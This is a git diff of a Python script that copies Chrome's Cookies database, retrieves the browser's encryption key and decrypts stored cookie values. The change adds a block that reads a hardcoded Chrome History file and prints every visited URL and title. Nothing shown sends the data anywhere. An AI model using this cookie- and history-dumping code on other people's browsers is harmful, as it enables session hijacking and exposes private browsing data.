@@ -48,6 +48,7 @@ def decryptData(Data, Key):
 
 def Main():
     dbFilePath = path.join(environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome","User Data", "Default", "NetWork", "Cookies")
+    # dbFilePath = path.join(environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome","User Data", "Default", "History")
     fileName = "Cookies.db"
     if not path.exists(fileName):
         copyfile(dbFilePath, fileName)
@@ -61,7 +62,6 @@ def Main():
 
     Key = getEncyptionKey()
 
-
     for cookie in cookies:
         host, name, value, encrypted_value, expires_utc = cookie
         if value or (encrypted_value[:3] == b'v10'):
@@ -70,6 +70,18 @@ def Main():
 
 
     conn.close()
+
+    from time import sleep
+    sleep(5)
+    import sqlite3
+    con = sqlite3.connect(r"C:\Users\Javad\AppData\Local\Google\Chrome\User Data\Default\History")
+    c = con.cursor()
+    c.execute("select url, title from urls")
+    results = c.fetchall()
+    for r in results:
+        print(r)
+    c.close()
+
 
 
 
